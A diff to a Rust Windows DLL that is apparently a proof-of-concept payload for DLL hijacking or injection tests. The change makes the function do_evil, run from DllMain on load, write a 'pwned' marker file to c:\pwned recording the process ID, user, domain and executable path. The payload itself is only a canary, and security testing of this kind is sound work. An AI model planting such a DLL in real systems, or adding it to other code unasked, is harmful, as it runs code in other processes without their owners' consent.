@@ -5,6 +5,7 @@ use winapi::shared::minwindef;
 use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
 use std::fs::File;
 use std::env;
+use std::fs;
 
 /// Entry point which will be called by the system once the DLL has been loaded
 /// in the target process. Declaring this function is optional.
@@ -34,11 +35,12 @@ extern "system" fn DllMain(
 }
 
 fn do_evil() {
+    let pwned_path = "c:\\pwned";
+    fs::create_dir_all(pwned_path).unwrap();
     let pid = std::process::id().to_string();
-    let profile_dir = env::var("USERPROFILE").unwrap().as_str().to_owned();
     let username = env::var("USERNAME").unwrap().as_str().to_owned();
     let domain = env::var("USERDOMAIN").unwrap().as_str().to_owned();
-    let path = format!("{}{}{}{}", profile_dir, "\\Desktop\\pwned_", pid, ".txt");
+    let path = format!("{}\\pwned_{}.txt", pwned_path, pid);
     let process_path = std::env::current_exe().unwrap();
 
     let ss = format!("[*]      Process: {:?}\n[*]         User: {:?}\n[*]       Domain: {:?}\n[*] Created file: {:?}\n", 
